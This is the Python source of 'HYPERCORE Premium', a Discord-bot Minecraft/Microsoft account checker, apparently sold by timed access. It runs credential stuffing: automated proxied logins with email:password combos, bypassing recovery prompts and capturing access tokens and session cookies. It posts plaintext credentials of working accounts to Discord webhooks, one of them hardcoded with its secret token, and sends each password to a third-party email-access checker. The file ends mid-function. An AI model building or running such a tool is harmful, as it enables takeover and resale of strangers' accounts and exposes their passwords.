from flask import Flask
import threading
import os
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host='0.0.0.0', port=port)
import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import threading
import queue
import time
from datetime import datetime, timedelta
import os
import zipfile
import requests
import re
import readchar
import os
import time
import threading
import random
import urllib3
import configparser
import json
import concurrent.futures
import traceback
import warnings
import uuid
import socket
import socks
import sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar
import hashlib
import math

# Linux-specific imports
try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    # Create basic color class for Linux
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BLACK = '\033[90m'
        RESET = '\033[0m'
        LIGHTCYAN_EX = '\033[96m'
        LIGHTYELLOW_EX = '\033[93m'
        LIGHTWHITE_EX = '\033[97m'

# Linux console utils replacement
class LinuxUtils:
    @staticmethod
    def set_title(title):
        # For Linux terminals
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

# Use Linux utils instead of console.utils
utils = LinuxUtils()

# Linux file dialog replacement
class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

# Minecraft imports
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library 'pycraft' not available. Ban checking will be disabled.")

logo = Fore.YELLOW+'''
╔══════════════════════════════════════════════════════════╗
║                     HYPERCORE PREMIUM                    ║
║              Minecraft Account Checker v3.0              ║
╚══════════════════════════════════════════════════════════╝
'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits = 0
bad = 0
twofa = 0
cpm = 0
cpm1 = 0
errors = 0
retries = 0
checked = 0
vm = 0
sfa = 0
mfa = 0
maxretries = 5
xgp = 0
xgpu = 0
other = 0
unbanned = 0
banned_count = 0
session_webhook_url = None
current_session = None  # Track current session for stop checks
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ==================== SIMPLE AUTH SYSTEM ====================
OWNER_ID = 1372949606500925492
AUTH_FILE = "authorized_users.json"

# Default webhook (hidden)
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1475033722800836629/N3yyRgr3wG8hWqtyAq2JDU5kffL9MSTxFGmEjNDzadXnLUk07AJ1Fds-IP_3eaSWS05Y"

class SimpleAuth:
    def __init__(self):
        self.users = self.load_users()
    
    def load_users(self):
        """Load authorized users from file"""
        if os.path.exists(AUTH_FILE):
            try:
                with open(AUTH_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_users(self):
        """Save authorized users to file"""
        with open(AUTH_FILE, 'w') as f:
            json.dump(self.users, f, indent=2)
    
    def parse_duration(self, duration_str):
        """Parse duration string like 1d, 1m"""
        duration_str = duration_str.lower().strip()
        
        # Extract number and unit
        number = int(''.join(filter(str.isdigit, duration_str)))
        unit = ''.join(filter(str.isalpha, duration_str))
        
        if unit == 'd' or unit == 'day' or unit == 'days':
            return timedelta(days=number)
        elif unit == 'm' or unit == 'month' or unit == 'months':
            return timedelta(days=number * 30)
        else:
            return None
    
    def add_user(self, user_id, duration_str):
        """Add a user with duration like 1d, 1m"""
        user_id = str(user_id)
        
        delta = self.parse_duration(duration_str)
        if not delta:
            return None, "Invalid duration. Use: 1d, 1m"
        
        expiry = (datetime.now() + delta).timestamp()
        self.users[user_id] = expiry
        self.save_users()
        return expiry, None
    
    def remove_user(self, user_id):
        """Remove a user"""
        user_id = str(user_id)
        if user_id in self.users:
            del self.users[user_id]
            self.save_users()
            return True
        return False
    
    def is_authorized(self, user_id):
        """Check if user is authorized"""
        # Owner always authorized
        if user_id == OWNER_ID:
            return True, None
        
        user_id = str(user_id)
        if user_id not in self.users:
            return False, "Not authorized"
        
        expiry = self.users[user_id]
        # Check if expired
        if expiry < datetime.now().timestamp():
            del self.users[user_id]
            self.save_users()
            return False, "Authorization expired"
        
        return True, expiry
    
    def list_users(self):
        """List all authorized users"""
        result = []
        for user_id, expiry in self.users.items():
            if expiry > datetime.now().timestamp():
                result.append((user_id, expiry))
        return result

auth = SimpleAuth()

def is_authorized():
    """Simple authorization check decorator"""
    async def predicate(interaction: discord.Interaction):
        authorized, _ = auth.is_authorized(interaction.user.id)
        if authorized:
            return True
        
        embed = discord.Embed(
            title="❌ Not Authorized",
            description="You need to be authorized to use this command.\nContact the bot owner to purchase access.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return False
    return app_commands.check(predicate)

# ==================== FULL CONFIG ====================
CONFIG = {
    "token": os.environ.get("DISCORD_TOKEN"),
"webhook": os.environ.get("DEFAULT_WEBHOOK"),
    "BannedWebhook": "",
    "UnbannedWebhook": "",
    "XboxWebhook": "",
    "XboxUltimateWebhook": "",
    "OtherWebhook": "",
    "ResultsWebhook": "",
    "max_retries": 5,
    "hypixelban": True,
    "embed": True,
    "auto_scrape_minutes": 5,
    "proxyless_ban_check": True,
    "set_name": True,
    "bot_name": "HYPERCORE",
    "set_skin": True,
    "skin_url": "https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif",
    "skin_variant": "classic",
    "hypixel_name": True,
    "hypixel_level": True,
    "hypixel_first_login": True,
    "hypixel_last_login": True,
    "optifine_cape": True,
    "minecraft_capes": True,
    "email_access": True,
    "hypixel_skyblock_coins": True,
    "hypixel_bedwars_stars": True,
    "name_change_availability": True,
    "last_name_change": True,
    "payment": True,
    "send_files_external": True,
    "webhook_message": " ||`<email>:<password>`||\n        Name: <name>\n        Account Type: <type>\n        Hypixel: <hypixel>\n        Hypixel Level: <level>\n        First Hypixel Login: <firstlogin>\n        Last Hypixel Login: <lastlogin>\n        Optifine Cape: <ofcape>\n        MC Capes: <capes>\n        Email Access: <access>\n        Hypixel Skyblock Coins: <skyblockcoins>\n        Hypixel Bedwars Stars: <bedwarsstars>\n        Banned: <banned>",
    "emojis": {
        "email": "<:email:1448840774438486097>",
        "password": "<a:password:1428674545702932531>",
        "nametag": "<:nametag:1439193947472924783>",
        "hypixel": "<a:hypixel:1433705221418258472>",
        "optifinecape": "<a:optifinecape:1433705569000357908>",
        "capes": "<a:capes:1433705405124706415>",
        "ms_coin": "<a:ms_coin:1433704564682653706>",
        "bedwars": "<:bedwars:1444675418853478520>",
        "banned": "<a:banned:1439876796655996988>",
        "target": "<a:target:1450820741070323752>",
        "file": "<a:file:1439876698740097065>",
        "setup": ":tools:",
        "queue": ":clock:",
        "progress": ":bar_chart:",
        "results": ":white_check_mark:",
        "account_types": ":game_die:",
        "xbox": ":xbox:",
        "technical": ":gear:",
        "rocket": ":rocket:",
        "finish": ":checkered_flag:",
        "error": ":warning:",
        "sync": ":arrows_counterclockwise:",
        "verified": ":white_check_mark:",
        "globe": ":globe_with_meridians:",
        "info": ":information_source:",
        "donut": ":doughnut:",
        "tick": ":white_check_mark:",
        "games": ":video_game:",
        "Xbox": ":xbox:",
        "finish_flag": ":checkered_flag:",
        "zerocloud": ":cloud:",
        "stats": ":bar_chart:",
        "Wrong": ":x:",
        "mcfa": ":lock:",
        "Warningggg": ":warning:",
        "System": ":gear:",
        "mail": ":envelope:"
    },
    "hypercore_branding": {
        "enabled": True,
        "embed_footer": "HYPERCORE Premium Checker",
        "embed_thumbnail": "https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif",
        "status_message": "HYPERCORE Checking System",
        "webhook_username": "HYPERCORE Checker"
    }
}

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None
        self.sfa_status = "False"
        self.payment_method = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl is not None: message+=f"\nHypixel: {self.hypixl}"
        if self.level is not None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin is not None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin is not None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape is not None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access is not None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins is not None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars is not None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if CONFIG.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: message+=f"\nLast Name Change: {self.lastchanged}"
        if self.payment_method is not None: message+=f"\nPayment Method: {self.payment_method}"
        return message+"\n============================\n"

    def notify(self, interaction=None):
        global errors, session_webhook_url, current_session
        
        # Check if session is still running before sending notification
        if current_session and not current_session.is_running:
            return
            
        try:
            webhook_urls = []
            
            # Type-specific webhooks
            is_xbox_ultimate = "Xbox Game Pass Ultimate" in str(self.type)
            is_xbox = "Xbox" in str(self.type) and not is_xbox_ultimate
            # Improved banned status check
            banned_str = str(self.banned).lower()
            is_unbanned = "false" in banned_str or "clean" in banned_str or "no" == banned_str or "not banned" in banned_str
            is_banned = not is_unbanned and banned_str != "unknown" and self.banned is not None

            webhook_type = "hit"
            if is_xbox_ultimate:
                webhook_type = "ultimate"
                url = CONFIG.get('XboxUltimateWebhook')
                if url: webhook_urls.append(url)
            elif is_xbox:
                webhook_type = "xbox"
                url = CONFIG.get('XboxWebhook')
                if url: webhook_urls.append(url)
            elif is_unbanned:
                webhook_type = "unbanned"
                url = CONFIG.get('UnbannedWebhook')
                if url:
                    urls = [u.strip() for u in url.split(',') if u.strip()]
                    if len(urls) > 1:
                        # Use global counter to alternate
                        global unbanned_count_alt
                        if 'unbanned_count_alt' not in globals(): unbanned_count_alt = 0
                        webhook_urls.append(urls[unbanned_count_alt % len(urls)])
                        unbanned_count_alt += 1
                    else:
                        webhook_urls.append(url)
            elif is_banned:
                webhook_type = "banned"
                url = CONFIG.get('BannedWebhook')
                if url:
                    urls = [u.strip() for u in url.split(',') if u.strip()]
                    if len(urls) > 1:
                        global banned_count_alt
                        if 'banned_count_alt' not in globals(): banned_count_alt = 0
                        webhook_urls.append(urls[banned_count_alt % len(urls)])
                        banned_count_alt += 1
                    else:
                        webhook_urls.append(url)
            else:
                url = CONFIG.get('OtherWebhook')
                if url: webhook_urls.append(url)
            
            # Hardcoded primary webhook
            primary_webhook = CONFIG.get('webhook')
            if primary_webhook:
                webhook_urls.append(primary_webhook)

            # Add session webhook if provided
            if session_webhook_url and session_webhook_url.startswith('http'):
                webhook_urls.append(session_webhook_url)

            # Clean up and deduplicate URLs
            webhook_urls = list(set([u for u in webhook_urls if u and str(u).startswith('http')]))

            # Get HYPERCORE branding settings
            hypercore_branding = CONFIG.get('hypercore_branding', {})
            branding_enabled = hypercore_branding.get('enabled', True)
            embed_footer = hypercore_branding.get('embed_footer', 'HYPERCORE Premium Checker')
            embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
            webhook_username = hypercore_branding.get('webhook_username', 'HYPERCORE Checker')

            # Check if we should send files to external webhook
            send_files_external = CONFIG.get('send_files_external', True)
            
            if CONFIG.get('embed') == True:
                embed_color = 0x00ff00 if webhook_type == "hit" else 0xff0000
                if is_unbanned: embed_color = 0x00ff00
                elif is_banned: embed_color = 0xff0000
                
                # HYPERCORE branded embed with custom emojis
                payload = {
                    "username": webhook_username,
                    "avatar_url": embed_thumbnail,
                    "embeds": [
                        {
                            "author": {
                                "name": "HYPERCORE Premium Checker",
                                "url": "https://discord.gg/hypercore",
                                "icon_url": embed_thumbnail
                            },
                            "title": f"✨ {self.name} ✨",
                            "color": embed_color,
                            "fields": [
                                {"name": f"{get_emoji('email')} Eᴍᴀɪʟ:", "value": f"||```{self.email}```||", "inline": True},
                                {"name": f"{get_emoji('password')} Pᴀѕѕᴡᴏʀᴅ:", "value": f"||```{self.password}```||", "inline": True},
                                {"name": f"{get_emoji('nametag')} Uѕᴇʀɴᴀᴍᴇ:", "value": f"``{self.name}``", "inline": True},
                                {"name": f"{get_emoji('hypixel')} Hʏᴘɪхᴇʟ", "value": f"``{self.hypixl if self.hypixl and self.hypixl != 'None' else 'N/A'}``", "inline": True},
                                {"name": f"{get_emoji('hypixel')} Hʏᴘɪхᴇʟ Lᴇᴠᴇʟ", "value": f"``{self.level if self.level and self.level != '0' else '0'}``", "inline": True},
                                {"name": f"{get_emoji('hypixel')} Fɪʀѕᴛ Lᴏɢɪɴ", "value": f"``{self.firstlogin if self.firstlogin and self.firstlogin != 'Never' else 'Never'}``", "inline": True},
                                {"name": f"{get_emoji('hypixel')} Lᴀѕᴛ Lᴏɢɪɴ", "value": f"``{self.lastlogin if self.lastlogin and self.lastlogin != 'Never' else 'Never'}``", "inline": True},
                                {"name": f"{get_emoji('optifinecape')} Oᴘᴛɪꜰɪɴᴇ Cᴀᴘᴇ", "value": f"``{self.cape if self.cape and self.cape != 'Unknown' else 'No'}``", "inline": True},
                                {"name": f"{get_emoji('capes')} Cᴀᴘᴇѕ", "value": f"``{self.capes if self.capes and self.capes != 'None' else 'None'}``", "inline": True},
                                {"name": f"{get_emoji('ms_coin')} Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴѕ", "value": f"``{self.sbcoins if self.sbcoins and self.sbcoins != '0' else '0'}``", "inline": True},
                                {"name": f"{get_emoji('bedwars')} Bᴇᴅᴡᴀʀѕ Sᴛᴀʀѕ", "value": f"``{self.bwstars if self.bwstars and self.bwstars != '0' else '0'}``", "inline": True},
                                {"name": f"{get_emoji('banned')} Sᴛᴀᴛᴜѕ", "value": f"``{self.banned if self.banned and self.banned != 'Unknown' else 'Clean'}``", "inline": True},
                                {"name": f"{get_emoji('nametag')} Rᴇɴᴀᴍᴇᴀʙʟᴇ", "value": f"``{self.namechanged if self.namechanged and self.namechanged != 'Unknown' else 'N/A'}``", "inline": True},
                                {"name": f"{get_emoji('nametag')} Lᴀѕᴛ Cʜᴀɴɢᴇᴅ", "value": f"``{self.lastchanged if self.lastchanged and self.lastchanged != 'Unknown' else 'N/A'}``", "inline": True},
                                {"name": f"{get_emoji('target')} Aᴄᴄᴏᴜɴᴛ Tʏᴘᴇ", "value": f"``{self.type if self.type and self.type != 'Unknown' else 'Unknown'}``", "inline": True},
                                {"name": f"{get_emoji('mail')} Eᴍᴀɪʟ Aᴄᴄᴇss:", "value": f"``{self.access if self.access and self.access != 'False' else 'False'}``", "inline": True},
                                {"name": f"{get_emoji('mcfa')} SFA:", "value": f"``{self.sfa_status or 'False'}``", "inline": True},
                                {"name": f"{get_emoji('file')} Cᴏᴍʙᴏ", "value": f"||```{self.email}:{self.password}```||", "inline": True},
                            ],
                            "thumbnail": {"url": f"https://mc-heads.net/body/{self.name}"},
                            "footer": {
                                "text": f"{embed_footer} • HYPERCORE",
                                "icon_url": embed_thumbnail
                            }
                        }
                    ]
                }
            else:
                message = CONFIG.get('webhook_message') or "HYPERCORE Hit: <name>\nEmail: <email>\nPassword: <password>\nType: <type>"
                payload = {
                    "content": message
                        .replace("<email>", str(self.email))
                        .replace("<password>", str(self.password))
                        .replace("<name>", str(self.name if self.name else "N/A"))
                        .replace("<hypixel>", str(self.hypixl if self.hypixl else "N/A"))
                        .replace("<level>", str(self.level if self.level else "N/A"))
                        .replace("<firstlogin>", str(self.firstlogin if self.firstlogin else "N/A"))
                        .replace("<lastlogin>", str(self.lastlogin if self.lastlogin else "N/A"))
                        .replace("<ofcape>", str(self.cape if self.cape else "N/A"))
                        .replace("<capes>", str(self.capes if self.capes else "N/A"))
                        .replace("<access>", str(self.access if self.access else "N/A"))
                        .replace("<skyblockcoins>", str(self.sbcoins if self.sbcoins else "N/A"))
                        .replace("<bedwarsstars>", str(self.bwstars if self.bwstars else "N/A"))
                        .replace("<banned>", str(self.banned if self.banned else "Unknown"))
                        .replace("<namechange>", str(self.namechanged if self.namechanged else "N/A"))
                        .replace("<lastchanged>", str(self.lastchanged if self.lastchanged else "N/A"))
                        .replace("<type>", str(self.type if self.type else "N/A")),
                    "username": webhook_username
                }

            for url in webhook_urls:
                try:
                    # Check again if session is still running
                    if current_session and not current_session.is_running:
                        break
                    
                    # Send embed - NO FILES WITH INDIVIDUAL HITS
                    r = requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
                    if r.status_code == 429:
                        retry_after = r.json().get('retry_after', 1)
                        print(f"Webhook rate limited, retrying after {retry_after}s")
                        time.sleep(retry_after)
                        requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
                except Exception as e:
                    print(f"Webhook error: {url} -> {e}")
                    
        except Exception as e:
            print(f"Notify error: {e}")


    def hypixel(self):
        global errors
        try:
            headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}
            tx = requests.get(f'https://plancke.io/hypixel/player/stats/{self.name}', proxies=getproxy(), headers=headers, verify=False).text
            
            if CONFIG.get('hypixel_name') is True:
                try: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: self.hypixl = "None"
                
            if CONFIG.get('hypixel_level') is True:
                try: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: self.level = "0"
                
            if CONFIG.get('hypixel_first_login') is True:
                try: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: self.firstlogin = "Never"
                
            if CONFIG.get('hypixel_last_login') is True:
                try: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: self.lastlogin = "Never"
                
            if CONFIG.get('hypixel_bedwars_stars') is True:
                try: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: self.bwstars = "0"
                
            if CONFIG.get('hypixel_skyblock_coins') is True:
                try:
                    req = requests.get(f"https://sky.shiiyu.moe/stats/{self.name}", proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: self.sbcoins = "0"
        except:
            errors += 1
            self.hypixl, self.level, self.firstlogin, self.lastlogin, self.bwstars, self.sbcoins = "None", "0", "Never", "Never", "0", "0"

    def optifine(self):
        if CONFIG.get('optifine_cape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if CONFIG.get('email_access') is True:
            try:
                # MCFA check: Full Access check
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True (FA)"
                    self.sfa_status = "False"
                    mfa+=1
                    if not os.path.exists(f"results/{fname}"): os.makedirs(f"results/{fname}")
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    self.sfa_status = "True"
                    if not os.path.exists(f"results/{fname}"): os.makedirs(f"results/{fname}")
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except Exception as e:
                self.access = f"Error: {e}"
                self.sfa_status = "Unknown"
    
    def namechange(self):
        if CONFIG.get('name_change_availability') is True or CONFIG.get('last_name_change') is True:
            tries = 0
            max_retries = CONFIG.get('max_retries', 5)
            while tries < max_retries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if CONFIG.get('name_change_availability') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if CONFIG.get('last_name_change') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1

    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def ban(self, session):
        global errors, unbanned, banned_count
        if CONFIG.get('hypixelban'):
            if not minecraft_available:
                self.banned = "Unknown (Library not available)"
                return
            from minecraft.authentication import AuthenticationToken, Profile
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            original_socket = socket.socket
            max_ban_retries = CONFIG.get('max_retries', 5) if CONFIG.get('max_retries', 5) > 0 else 3
            while tries < max_ban_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    global unbanned, banned_count
                    try:
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip() if 'extra' in data and len(data['extra']) > 6 else 'N/A'}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text'] if len(data['extra']) > 1 else 'Temp'}] {data['extra'][4]['text'].strip() if len(data['extra']) > 4 else ''} Ban ID: {data['extra'][8]['text'].strip() if len(data['extra']) > 8 else 'N/A'}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "kicked" in str(data).lower() or "disconnect" in str(data).lower():
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        else:
                            try:
                                self.banned = ''.join(item["text"] for item in data.get("extra", []))
                            except:
                                self.banned = str(data)
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                    except Exception as e:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    global unbanned
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                proxy_was_set = False
                connection_error = None
                try:
                    proxies_to_use = banproxies if len(banproxies) > 0 else proxylist
                    if len(proxies_to_use) > 0:
                        proxy = random.choice(proxies_to_use)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                        proxy_was_set = True
                    elif CONFIG.get('proxyless_ban_check') != True:
                        self.banned = "Unknown (No proxy)"
                        return
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        max_wait = 3000
                        while self.banned == None and c < max_wait:
                            time.sleep(.01)
                            c+=1
                        try:
                            connection.disconnect()
                        except:
                            pass
                    except Exception as conn_error:
                        connection_error = str(conn_error)
                    finally:
                        sys.stderr = original_stderr
                        if proxy_was_set:
                            socket.socket = original_socket
                            socks.set_default_proxy()
                except Exception as outer_error:
                    connection_error = str(outer_error)
                    if proxy_was_set:
                        socket.socket = original_socket
                        socks.set_default_proxy()
                if self.banned != None: 
                    break
                tries+=1
                if tries < max_ban_retries:
                    time.sleep(0.5)
            socket.socket = original_socket
            socks.set_default_proxy()
            if self.banned == None:
                self.banned = "False"
                with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                unbanned += 1
                try:
                    self.save_cookies('Unbanned')
                except:
                    pass
                time.sleep(1)

    def handle(self, session):
        global hits, current_session
        
        # Check if session is still running before processing
        if current_session and not current_session.is_running:
            return
            
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        with open(f"results/{fname}/Capes.txt", 'a') as file: file.write(f"{self.email}:{self.password} | Capes: {self.capes}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    max_tries = CONFIG.get('max_retries', 5) if CONFIG.get('max_retries', 5) > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxies = getproxy()
        retries += 1
        tries += 1
    raise Exception("Failed to get authentication URL after max retries")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    max_retries = CONFIG.get('max_retries', 5)
    while tries < max_retries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
